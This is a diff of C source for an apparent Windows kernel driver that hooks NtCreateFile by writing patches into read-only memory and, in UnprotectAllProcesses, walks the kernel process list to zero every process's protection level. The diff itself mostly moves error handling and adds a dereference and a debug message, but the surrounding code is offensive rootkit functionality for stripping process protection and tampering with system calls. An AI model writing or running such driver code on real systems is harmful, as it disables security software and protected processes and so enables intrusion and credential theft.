@@ -198,7 +198,6 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo)
 
     hooklist_s->pID = rfileinfo.rpid;
     RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));
-    //hooklist_s->filename = rfileinfo.filename;
 
     write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));
 
@@ -212,23 +211,24 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo)
 DWORD UnprotectAllProcesses() {
     PVOID process = NULL;
     PLIST_ENTRY plist;
+
+    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
+
+    if (!NT_SUCCESS(ret))
+    {
+        if (ret == STATUS_INVALID_PARAMETER)
+        {
+            DbgPrint("the process ID was not found.");
+        }
+        if (ret == STATUS_INVALID_CID)
+        {
+            DbgPrint("the specified client ID is not valid.");
+        }
+        return (-1);
+    }
+
     __try
     {
-
-        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
-        if (ret != STATUS_SUCCESS)
-        {
-            if (ret == STATUS_INVALID_PARAMETER)
-            {
-                DbgPrint("the process ID was not found.");
-            }
-            if (ret == STATUS_INVALID_CID)
-            {
-                DbgPrint("the specified client ID is not valid.");
-            }
-            return (-1);
-        }
-
         plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);
 
         while (plist->Flink != (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset))
@@ -240,12 +240,13 @@ DWORD UnprotectAllProcesses() {
             *(BYTE*)EProtectionLevel = (BYTE)0;
 
             plist = plist->Flink;
+
         }
     }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        return (-1);
+    __finally {
+        ObDereferenceObject(process);
     }
+
 }
 
 DWORD
@@ -840,6 +841,7 @@ DriverEntry(
 
     if (InializeOffsets())
     {
+        DbgPrint("unsupported windows build !\n");
         unloadv(driverObject);
         return (STATUS_UNSUCCESSFUL);
     }
